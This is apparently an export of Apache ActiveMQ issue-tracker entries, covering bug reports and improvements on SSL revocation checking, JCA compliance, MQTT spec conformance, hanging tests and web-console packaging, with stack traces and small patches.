Currently it"s possible to require client authentication during SSL/TLS handshake by adding needClientAuth=true query string to the respective connector URI. But it is not possible to configure revocation checking of the certificate submitted by the client.The attached patch adds the capability by introducing a new attribute - crl - of the org.apache.activemq.spring.SpringSslContext class and updating the org.apache.activemq.spring.SpringSslContext.createTrustManagers() method to make use of the value specified for the attribute in the corresponding <sslContext /> tag as appropriate.The code is inspired by a similar code in jetty webserver: https://github.com/eclipse/jetty.project/blob/release-9/jetty-util/src/main/java/org/eclipse/jetty/util/ssl/SslContextFactory.java#L927-L965Please consider it for merging.
issueID:AMQ-501
type:Bug
changed files:ActiveMQPrefetchPolicy.java
RedeliveryPolicy.java
texts:ActiveMQ  is not JCA1.5 compliant
When attempting to install the ActiveMQ RAR, these errors are thrown, and appear to be vaild and correct (verified by browsing the ActiveMQ source code). Classloading problems appear to prevent using ActiveMQ using the Foriegn JMS facility of Weblogic.&#91;1&#93; The ra.xml <managedconnectionfactory-class> class "org.activemq.ra.ActiveMQManagedConnectionFactory" must override both equals() and hashCode(), but doesn"t.&#91;2&#93; The ra.xml <managedconnectionfactory-class> class "org.activemq.ra.ActiveMQManagedConnectionFactory" must override both equals() and hashCode(), but doesn"t.&#91;3&#93; The ra.xml <managedconnectionfactory-class> class "org.activemq.ra.ActiveMQManagedConnectionFactory" must override both equals() and hashCode(), but doesn"t.&#91;4&#93; The ra.xml <activationspec-class> "org.activemq.ra.ActiveMQActivationSpec" must implement java.io.Serializable but does not.
issueID:AMQ-5011
type:Improvement
changed files:
texts:Statistics plugin doesn&#39;t fill in Message timestamp or priority
StatisticsBrokerPlugin should fill in Message timestamp and priority
issueID:AMQ-5013
type:Bug
changed files:
texts:RestPersistentTest sometimes hangs on CI boxes
This test hangs occasionally on CI boxes.  I"m going to convert it to JUnit 4 and add timeouts as the first step in trying to resolve this.
issueID:AMQ-5015
type:Improvement
changed files:
texts:Temp Queue gets deleted on close of wrong connection
My scenario is this:connection1:create temp queue tq1send msg to qeue1 with replyTo tq1wait for reply on tq1connection2:receive message on queue1send to replyTo address which is tq1In some cases the temp queue gets deleted in the close method of connection2.The scenario is kind of an edge case as it only happens if I use a PooledConnectionFactory and only if I before my scenario above open a connection and session and close the connection before the session.So strictly speaking my code has an error. I think the problem is in the PooledConnection factory. It seems to reuse a connection or session in the wrong way. I will attach a test case
issueID:AMQ-5016
type:Bug
changed files:BitArrayBin.java
texts:BitArrayBin doesn&#39;t work well with index larger than Integer.MAX_VALUE
In BitArrayBin class, the index"s unit type is long. It also has a variable called firstIndex, which store the index where the window starts. And that firstindex"s unit is int. If the index is bigger than Integer.MAX_VALUE, setBit() and getBit() starts to return bad value.The defect causes activemq client to perform badly when receiving message that sequence id is bigger than max interger. It spends most of the time to shift window, and also blocks other consumer threads. Below is the jstack log that shows the problem."ActiveMQ Session Task-869879" prio=10 tid=0x00007f412d6ee000 nid=0x3cbe runnable [0x00007f405b7b6000]   java.lang.Thread.State: RUNNABLE        at java.util.LinkedList.linkLast(LinkedList.java:140)        at java.util.LinkedList.add(LinkedList.java:336)        at org.apache.activemq.util.BitArrayBin.getBitArray(BitArrayBin.java:123)        at org.apache.activemq.util.BitArrayBin.setBit(BitArrayBin.java:59)        at org.apache.activemq.ActiveMQMessage AuditNoSync.isDuplicate(ActiveMQMessageAuditNoSyn c.java:160)        at org.apache.activemq.ActiveMQMessageAudit.isDuplicate(ActiveMQMessageAudit.java:59)        - locked <0x00007f46a0138ab0> (a org.apache.activemq.ActiveMQMessageAudit)        at org.apache.activemq.ActiveMQMessage AuditNoSync.isDuplicate(ActiveMQMessageAuditNoSyn c.java:140)        at org.apache.activemq.ConnectionAudit.isDuplicate(ConnectionAudit.java:52)        - locked <0x00007f4881e6b968> (a org.apache.activemq.ConnectionAudit)        at org.apache.activemq.ActiveMQConnection.isDuplicate(ActiveMQConnection.java:2291)        at org.apache.activemq.ActiveMQMessageConsumer.dispatch(ActiveMQMessageConsumer.java:1223)        - locked <0x00007f45db222fb8> (a java.lang.Object)        at org.apache.activemq.ActiveMQSessionExecutor.dispatch(ActiveMQSessionExecutor.java:134)        at org.apache.activemq.ActiveMQSessionExecutor.iterate(ActiveMQSessionExecutor.java:205)        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:127)        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)        at java.lang.Thread.run(Thread.java:722)
issueID:AMQ-5017
type:Bug
changed files:ActiveMQPrefetchPolicy.java
texts:ActiveMQPrefetchPolicy.setAll sets inputStreamPrefetch incorrectly
ActiveMQPrefetchPolicy.setAll() sets "this.inputStreamPrefetch" to "1", which i assume is supposed to be "i".
issueID:AMQ-502
type:Bug
changed files:
texts:TEST org.apache.activemq.transport.stomp.StompTest FAILED
Diabling test until it is fixed.
issueID:AMQ-5021
type:Bug
changed files:
texts:org.apache.activemq.bugs.MemoryUsageBlockResumeTest sometimes hangs
org.apache.activemq.bugs.MemoryUsageBlockResumeTest sometimes hangs, which can block CI builds.  I will update it to JUnit4 and add a timeout so it at least does not cause the build to hang.I am also attaching a stack trace.
issueID:AMQ-5028
type:Bug
changed files:
texts:Remove jetty and jsp compiler jars from web-console.war
The container that runs the war (like Jetty or Tomcat) will compile the JSP"s so there is no need for the eclipse core compiler.   Also, there isn"t a need for the jetty jars.  It looks like there was an attempt to exclude those from packaging anyway via maven-war-plugin configs, but those configs aren"t working.patch:diff --git a/activemq-web-console/pom.xml b/activemq-web-console/pom.xmlindex e5f2e94..93b7fad 100755--- a/activemq-web-console/pom.xml<?xml version="1.0" encoding="UTF-8"?><!--+++ b/activemq-web-console/pom.xml@@ -190,6 +190,14 @@               <groupId>${project.groupId}</groupId>               <artifactId>activemq-all</artifactId>           </exclusion>+          <exclusion>+              <groupId>org.eclipse.jetty</groupId>+              <artifactId>jetty-websocket</artifactId>+          </exclusion>+          <exclusion>+              <groupId>org.eclipse.jetty</groupId>+              <artifactId>jetty-continuation</artifactId>+          </exclusion>       </exclusions>     </dependency>     <dependency>@@ -235,6 +243,7 @@       <groupId>org.eclipse.jdt</groupId>       <artifactId>core</artifactId>       <version>3.1.1</version>+      <scope>test</scope>     </dependency>     <dependency>       <groupId>org.slf4j</groupId>@@ -259,16 +268,6 @@       <artifactId>standard</artifactId>     </dependency> -    <!-- XStream marshalling -->-    <dependency>-      <groupId>xpp3</groupId>-      <artifactId>xpp3</artifactId>-    </dependency>-    <dependency>-      <groupId>com.thoughtworks.xstream</groupId>-      <artifactId>xstream</artifactId>-    </dependency>-     <!-- used for testing -->     <dependency>       <groupId>junit</groupId>
issueID:AMQ-5029
type:Bug
changed files:
texts:embedded webconsole broker does not resolve activemq.data system property
When using jetty:run in activemq-web-console or deploying the war into tomcat, the activemq.data system property is not resolved into a directory name for the kahadb.   Thus, a ${acitvemq.data} directory is created which is strange looking.   The property placeholder thing needs to be added to the spring config.
issueID:AMQ-5031
type:Improvement
changed files:
texts:Allow isSameRM override from broker identity to connection identity to avoid xa.join
When two connection are involved in an xa transaction, 1pc is great and basing the xaresource identity on the broker identity makes sense. However in the cases that an joined xa association is not ended, which seems ok from an xa perspective, a joined association is left in error.To avoid this, we need a way to force 2pc across multiple connections to the same broker.A broker url param like jms.rmIdFromConnectionId=true will do the trick and ensure that the RM identity is tied to the connection and not the broker.
issueID:AMQ-5033
type:Bug
changed files:
texts:webconsole url and html encoding missing
While working on AMQ-4813, many cases of passing text through to HTML without proper HTML and URL encoding.I believe this can cause security risks, failed operations, or a misformatted UI.
issueID:AMQ-5035
type:Bug
changed files:
texts:deleting durable subscriber exception
refer to http://activemq.2283324.n4.nabble.com/deleting-durable-subscriber-exception-tp4677521.htmlgetting following exception when deleting a durable subscriber with schedulerSupport set to true on the broker2014-02-06 15:25:44,042 | WARN  | /admin/deleteSubscriber.action | org.eclipse.jetty.servlet.ServletHandler | qtp1100010806-60 java.lang.ClassCastException: org.apache.activemq.broker.scheduler.SchedulerBroker cannot be cast to org.apache.activemq.broker.region.RegionBroker         at org.apache.activemq.advisory.AdvisoryBroker.removeSubscription(AdvisoryBroker.java:280)         at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:112)         at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:112)         at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:112)         at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:112)         at org.apache.activemq.broker.MutableBrokerFilter.removeSubscription(MutableBrokerFilter.java:117)         at org.apache.activemq.broker.jmx.BrokerView.destroyDurableSubscriber(BrokerView.java:430)         at org.apache.activemq.web.controller.DeleteSubscriber.handleRequest(DeleteSubscriber.java:38)         at org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter.handle(SimpleControllerHandlerAdapter.java:48)         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:925)         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:856)         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:936)         at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:827)         at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:812)         at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)         at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:652)         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1320)         at org.apache.activemq.web.AuditFilter.doFilter(AuditFilter.java:59)         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)         at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107)         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)         at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:102)         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)         at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)         at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)         at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1291)         at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:443)         at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)         at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:521)         at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:227)         at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1044)         at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:372)         at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:189)         at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:978)         at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)         at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:154)         at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:521)         at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:154)         at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)         at org.eclipse.jetty.server.Server.handle(Server.java:367)         at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:486)         at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:926)         at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:988)         at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:640)         at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)         at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:82)         at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:628)         at org.eclipse.jetty.io.nio.SelectChannelEndPoint$1.run(SelectChannelEndPoint.java:52)         at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608)         at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)         at java.lang.Thread.run(Thread.java:695) To reproduce:1. Download fresh copy and install 2. Edit conf/activemq.xml and change broker line to <broker xmlns="http://activemq.apache.org/schema/core" brokerName="localhost" dataDirectory="${activemq.data}" schedulerSupport="true"> 3. Go to admin console and create a topic, http://localhost:8161/admin/topics.jsp4. Go to admin console and create durable subscriber to topic above http://localhost:8161/admin/subscribers.jsp5. Delete the durable subscriber using link on same page and it will fail Repeat all steps above but this time set schedulerSupport=false. Then it will delete the durable without any errors.
issueID:AMQ-5036
type:Bug
changed files:
texts:AMQ4914.testSendHugeMessage times out on slow CI boxes
Just need to bump up the timeout.
issueID:AMQ-5038
type:Bug
changed files:
texts:RAR - Active session can delay/block endpoint deactivation on shutdown
If there are pending messages, a mdb endpoint deactivation can wait pending active session close. Thread dump of the form:3XMTHREADINFO "Non-deferrable Alarm : 0" J9VMThread:0x0000000030F28E00, j9thread_t:0x0000010016C22740, java/lang/Thread:0x0000000041CAAE70, state:CW, prio=53XMJAVALTHREAD (java/lang/Thread getId:0x47, isDaemon:true)3XMTHREADINFO1 (native thread ID:0x39E051, native priority:0x5, native policy:UNKNOWN)3XMTHREADINFO3 Java callstack:4XESTACKTRACE at java/lang/Object.wait(Native Method)4XESTACKTRACE at java/lang/Object.wait(Object.java:196(Compiled Code))4XESTACKTRACE at org/apache/activemq/ra/ServerSessionPoolImpl.close(ServerSessionPoolImpl.java:273)4XESTACKTRACE at org/apache/activemq/ra/ActiveMQEndpointWorker.stop(ActiveMQEndpointWorker.java:265)4XESTACKTRACE at org/apache/activemq/ra/ActiveMQResourceAdapter.endpointDeactivation(ActiveMQResourceAdapter.java:216)4XESTACKTRACE at com/ibm/ejs/j2c/ActivationSpecWrapperImpl.deactivateUnderRAClassLoaderContext(ActivationSpecWrapperImpl.java:508)4XESTACKTRACE at com/ibm/ejs/j2c/ActivationSpecWrapperImpl.deactivateEndPoint(ActivationSpecWrapperImpl.java:411)4XESTACKTRACE at com/ibm/ejs/j2c/RAWrapperImpl.deactivateEndpoint(RAWrapperImpl.java:1462)4XESTACKTRACE at com/ibm/ejs/j2c/RALifeCycleManagerImpl.deactivateEndPoint(RALifeCycleManagerImpl.java:1811)....Issue is inactive session are closed, but active sessions do not get an indication of the pending shutdown.
issueID:AMQ-5041
type:Bug
changed files:
texts:JMSClientTest is hanging
The JMSClientTest is currently hanging on multiple test cases.  I"ll attach a stack trace, but it looks like the test is hanging during the broker.stop in tearDown().I"m going to add @Ignore tags to most of the tests so this stops hanging CI builds.
issueID:AMQ-5042
type:Bug
changed files:
texts:Session.commit() hangs when amqp+nio is used
The follow test will cause a hang when run against amqp+nio transport.    @Test(timeout=30000)    public void testSessionTransactedCommit() throws JMSException, InterruptedException {        ActiveMQAdmin.enableJMSFrameTracing();        Connection connection = createConnection();        Session session = connection.createSession(true, Session.AUTO_ACKNOWLEDGE);        Queue queue = session.createQueue(name.toString());        connection.start();        // transacted producer        MessageProducer pr = session.createProducer(queue);        for (int i = 0; i < 10; i++) {            Message m = session.createTextMessage("TestMessage" + i);            pr.send(m);        }        // No commit in place, so no message should be dispatched.        MessageConsumer consumer = session.createConsumer(queue);        TextMessage m = (TextMessage) consumer.receive(5000);        assertNull(m);        session.commit();        // Messages should be available now.        for (int i = 0; i < 10; i++) {            Message msg = consumer.receive(5000);            assertNotNull(msg);        }        session.close();        connection.close();    }
issueID:AMQ-5043
type:Bug
changed files:pom.xml
DestinationMapNode.java
MQTTProtocolConverter.java
MQTTRetainedMessages.java
IDERunner.java
texts:Improve MQTT spec compatibility
None
issueID:AMQ-5047
type:Bug
changed files:
texts:Maven version affects packaging
Depending on if you use Maven 3.0.5 or 3.1.1, you get significantly different contents for the Web Console war as well as the final binary assembly.  The two versions of Maven treat the optional=true tags in the top level pom a bit differently.The proposed fix is to remove the optional=true tags from the top level and add them where appropriate in the child modules.
issueID:AMQ-5049
type:Improvement
changed files:
texts:Set headless when running tests.
When running on OSX, the tests in many of the modules cause the "java icon" to pop up on the Doc and steal the keyboard focus.   It would be better to run the tests headless to prevent that.Also, forcing 512M for the forked VM fixes some issues in activemq-amqp.
issueID:AMQ-505
type:New Feature
changed files:NetworkConnector.java
DemandForwardingBridge.java
texts:Add ability to disable network bridge priority dropping.
None
issueID:AMQ-5050
type:Improvement
changed files:
texts:Populate a &#39;Host&#39; header in the WireFormatInfo of the Openwire protocol to let multi-tenant proxies route connections
None
issueID:AMQ-5051
type:Bug
changed files:MQTTInactivityMonitor.java
texts:MQTTInactivityMonitor throws a NullPointerException
MQTTInactivityMonitor has a very obvious NPE issue in onException(), which aborts propagating the exception to it"s transportListener and causes connection leaks.
issueID:AMQ-5052
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:DemandForwardingBridgeSupport has noisy log
DemandForwardingBridgeSupport#serviceRemoteConsumerAdvisory has a code:            if (info.isBrowser()) {                LOG.info("{} Ignoring sub from {}, browsers explicitly suppressed", configuration.getBrokerName(), remoteBrokerName);                return;            }the original version is:            if (info.isBrowser()) {                if (LOG.isDebugEnabled()) {                    LOG.info(configuration.getBrokerName() + " Ignoring sub from " + remoteBrokerName + ", browsers explicitly suppressed");                }                return;            }New version code is noisy because broker always show info log when client browse message.Please change code to:            if (info.isBrowser()) {                LOG.debug("{} Ignoring sub from {}, browsers explicitly suppressed", configuration.getBrokerName(), remoteBrokerName);                return;            }Thanks
issueID:AMQ-5053
type:Bug
changed files:
texts:BrokerRedeliveryTest.testNoScheduledRedeliveryOfExpired fails intermittently
This happens fairly regularly on CI boxes, at least on AWS.  For some reason the producerConnection.close() in sendMessage occasionally takes just over 1000 ms, which means the message expires before the test has a chance to receive it.
issueID:AMQ-5054
type:Bug
changed files:
texts:Display the number of active transactions and age of oldest transaction on a Connection&#39;s JMX info
Long running transactions can affect the ability of KahaDB to gc log files.  Being able to identify which connections have the long running transactions would operations folks deal with these problems.
issueID:AMQ-5058
type:Bug
changed files:MQTTProtocolConverter.java
texts:Broker MUST respond with CONNACK with return code 0x02 for zero length client id and 0 cleansession
The CONNECT.decode() method from mqtt-client had an issue which has been fixed in https://github.com/fusesource/mqtt-client/pull/31Wit this fix MQTTProtocolConverter.onConnect() can now check for the condition outlined below and return a CONNACK with return code 0x02. From MQTT 3.1.1 draft specification&#91;MQTT-3.1.3-6&#93; A Server MAY allow a Client to supply a ClientId that has a length of zero bytes.However if it does so the Server MUST treat this as a special case and assign aunique ClientId to that Client. It MUST then process the CONNECT packet as ifthe Client had provided that unique ClientId.&#91;MQTT-3.1.3-7&#93; If the Client supplies a zero-byte ClientId, the Client MUST also set CleanSession to 1.&#91;MQTT-3.1.3-8&#93; If the Client supplies a zero-byte ClientId with Clean Session set to 0, the ServerMUST respond to the CONNECT Packet with a CONNACK return code 0x02(Identifier rejected) and then close the Network Connection.&#91;MQTT-3.1.3-9&#93; If the Server rejects the ClientId it MUST respond to the CONNECT Packet witha CONNACK return code 0x02 (Identifier rejected) and then close the NetworkConnection.
issueID:AMQ-5059
type:Bug
changed files:MQTTProtocolConverter.java
texts:The first packet from client to Broker MUST be a CONNECT packet, Broker MUST disconnect when UNSUBSCRIBE is the first packet
The method MQTTProtocolConverter.onUnSubscribe(UNSUBSRIBE command) does not call checkConnected() to check whether CONNECT has already been received or not.
issueID:AMQ-5060
type:Task
changed files:
texts:Upgrade to xstream 1.4.7
Fix for CVE-2013-7285
issueID:AMQ-5062
type:Bug
changed files:
texts:JMSClientNioTest fails intermittently
I"m not sure whether this is just a test issue.  All test cases pass if run individually, and sometimes the whole test suite passes.  Other times, however, it gets errors like those shown below.  Depending on the run, different test cases will fail.------------------------------------------------------- T E S T S-------------------------------------------------------Running org.apache.activemq.transport.amqp.JMSClientNioTestTests run: 21, Failures: 3, Errors: 1, Skipped: 0, Time elapsed: 343.636 sec <<< FAILURE! - in org.apache.activemq.transport.amqp.JMSClientNioTesttestExecptionListenerCalledOnBrokerStop(org.apache.activemq.transport.amqp.JMSClientNioTest)  Time elapsed: 21.063 sec  <<< FAILURE!java.lang.AssertionError: No exception listener event fired. at org.junit.Assert.fail(Assert.java:88) at org.junit.Assert.assertTrue(Assert.java:41) at org.apache.activemq.transport.amqp.JMSClientTest.testExecptionListenerCalledOnBrokerStop(JMSClientTest.java:715) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.FailOnTimeout$StatementThread.run(FailOnTimeout.java:74)testTopicConsumerSync(org.apache.activemq.transport.amqp.JMSClientNioTest)  Time elapsed: 77.172 sec  <<< ERROR!java.lang.Exception: test timed out after 45000 milliseconds at java.lang.Object.wait(Native Method) at java.lang.Object.wait(Object.java:503) at org.apache.qpid.amqp_1_0.transport.ConnectionEndpoint.open(ConnectionEndpoint.java:154) at org.apache.qpid.amqp_1_0.client.Connection.<init>(Connection.java:284) at org.apache.qpid.amqp_1_0.client.Connection.<init>(Connection.java:143) at org.apache.qpid.amqp_1_0.jms.impl.ConnectionImpl.connect(ConnectionImpl.java:115) at org.apache.qpid.amqp_1_0.jms.impl.ConnectionImpl.start(ConnectionImpl.java:284) at org.apache.activemq.transport.amqp.JMSClientTest.createConnection(JMSClientTest.java:794) at org.apache.activemq.transport.amqp.JMSClientTest.createConnection(JMSClientTest.java:754) at org.apache.activemq.transport.amqp.JMSClientTest.testTopicConsumerSync(JMSClientTest.java:626) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.FailOnTimeout$StatementThread.run(FailOnTimeout.java:74)testConsumerReceiveTimedThrowsWhenBrokerStops(org.apache.activemq.transport.amqp.JMSClientNioTest)  Time elapsed: 12.525 sec  <<< FAILURE!java.lang.AssertionError: Should have thrown an IllegalStateException at org.junit.Assert.fail(Assert.java:88) at org.apache.activemq.transport.amqp.JMSClientTest.testConsumerReceiveTimedThrowsWhenBrokerStops(JMSClientTest.java:411) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.FailOnTimeout$StatementThread.run(FailOnTimeout.java:74)testConsumerReceiveNoWaitThrowsWhenBrokerStops(org.apache.activemq.transport.amqp.JMSClientNioTest)  Time elapsed: 12.515 sec  <<< FAILURE!java.lang.AssertionError: Should have thrown an IllegalStateException at org.junit.Assert.fail(Assert.java:88) at org.apache.activemq.transport.amqp.JMSClientTest.testConsumerReceiveNoWaitThrowsWhenBrokerStops(JMSClientTest.java:380) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:47) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:44) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.internal.runners.statements.FailOnTimeout$StatementThread.run(FailOnTimeout.java:74)Results :Failed tests:   JMSClientNioTest>JMSClientTest.testExecptionListenerCalledOnBrokerStop:715 No exception listener event fired.  JMSClientNioTest>JMSClientTest.testConsumerReceiveTimedThrowsWhenBrokerStops:411 Should have thrown an IllegalStateException  JMSClientNioTest>JMSClientTest.testConsumerReceiveNoWaitThrowsWhenBrokerStops:380 Should have thrown an IllegalStateExceptionTests in error:   JMSClientNioTest>JMSClientTest.testTopicConsumerSync:626->JMSClientTest.createConnection:754->JMSClientTest.createConnection:794->Object.wait:503->Object.wait:-2 » Tests run: 21, Failures: 3, Errors: 1, Skipped: 0
issueID:AMQ-5064
type:Task
changed files:
texts:Update QPid client to v0.26
Update to latest release.
issueID:AMQ-5065
type:Bug
changed files:
texts:MQTT Retained message QoS must be set to a maximum of Subscription&#39;s QoS
Retained messages must have a QoS of either the one set by the original publisher of the message or the maximum of the QoS of the subscription QoS granted to a receiver.
issueID:AMQ-5066
type:Bug
changed files:
texts:Duplicate MQTT Subscription with a different QoS for the same Topic MUST remove the older Subscription
When a client sends a SUBSCRIBE message with the same Topic/Filter as a previous SUBSCRIBE message but a different QoS, the Server MUST discard the older subscription, and resend all retained messages limited to the new Subscription QoS.
issueID:AMQ-5068
type:Bug
changed files:
texts:Support hardening/persisting the JMSRedeliveryFlag across restarts
WMQ supports a HARDENBO&#91;1&#93; flag on the redelivery flag impl. Which persists before dispatch. And has a corresponding performance impact.So we need to implement an additional journal command to persist delivery attempts and update the counter on restart/recovery to get parity.This will allow the redeliverFlag to be guaranteed to flag a potential duplicate dispatch in the event of a hard broker failure just after dispatch.&#91;1&#93; http://publib.boulder.ibm.com/infocenter/wmqv7/v7r0/index.jsp?topic=%2Fcom.ibm.mq.explorer.doc%2Fe_properties_queues.htm
issueID:AMQ-5070
type:Bug
changed files:
texts:Broker should stop accepting work when trying to shut down transports
While broker is shutting down, rarely in overstressed environment, it can block for a while trying to stop transport connections. In those situations we should prevent the broker from accepting any work (new connections and commands through existing ones).
issueID:AMQ-5071
type:Bug
changed files:PooledTaskRunner.java
texts:Wrong or incomplete log message in PooledTaskRunner class.
Shutdown method provide incomplete trace information because second variable is missing for second {} in LOG.trace(...)  /** shut down the task     * @throws InterruptedException     */    public void shutdown(long timeout) throws InterruptedException {        LOG.trace("Shutdown timeout: {} task: {}", task);Should be changed to: LOG.trace("Shutdown timeout: {} task: {}", timeout,task);
issueID:AMQ-5072
type:New Feature
changed files:
texts:Support configuring a different directory for the KahaDB index files.
None
issueID:AMQ-5073
type:Bug
changed files:
texts:Session.commit() hangs when amqp+nio+ssl is used
This is similar to AMQ-5042.  To reproduce run JMSClientTest.testSessionTransactedCommit using nio+ssl.  (I will add JMSClientNioPlusSslTest shortly)
issueID:AMQ-5074
type:Bug
changed files:
texts:MQTT paths with empty levels are not handled correctly
MQTT allows empty "" names for path levels, for example /TopicA has two levels, "" and TopicA, similarly TopicA/ has two levels TopicA and "". The leading and trailing "/" in MQTT is significant. The "/" character in MQTT paths and filters is mapped to "." in ActiveMQ, which leads to names like ".TopicA" and "TopicA.". However, ActiveMQ ignores empty path levels, although, they are just as significant for ActiveMQ. Although these path names are not common in ActiveMQ, which maybe the reason why the issue hasn"t been discovered until now. ActiveMQ needs to treat empty levels as significant, and pattern match accordingly. This requires change to ActiveMQDestination.getDestinationPaths() and some code cleanup in DestinationMap related classes and Destination filtering classes. A patch is attached (along with unit tests) to address this issue.
issueID:AMQ-5075
type:Bug
changed files:AmqpProtocolConverter.java
texts:AMQP Transport throws unauthorized access for all error that occur during a connection attempt
When a client attempts to connect and the attempt fails for things other than a security violation the broker should set a different ErrorCondition on the Proton transport.  For instance the InvalidClientIdException shouldn"t trigger that error but instead should trigger an INVALID_FIELD condition.
issueID:AMQ-5076
type:Improvement
changed files:
texts:Pooled session creation blocks when maxActive is reached
Pooled session creation blocks when maxActive is reached. This is configurable to either block or thrown an exception. We should maybe expose the config to the generic pool we use under the covers so it can be even more fine tuned, or at least provide a way to set a timeout on the blocking behavior so that threads don"t sit and block forever.See http://commons.apache.org/proper/commons-pool/api-1.6/org/apache/commons/pool/impl/GenericKeyedObjectPool.html andhttp://commons.apache.org/proper/commons-pool/api-1.6/org/apache/commons/pool/impl/GenericKeyedObjectPool.html#setMaxWait(long)
issueID:AMQ-5077
type:Improvement
changed files:
texts:Improve performance of composite topic fanout and persistent asyncSend
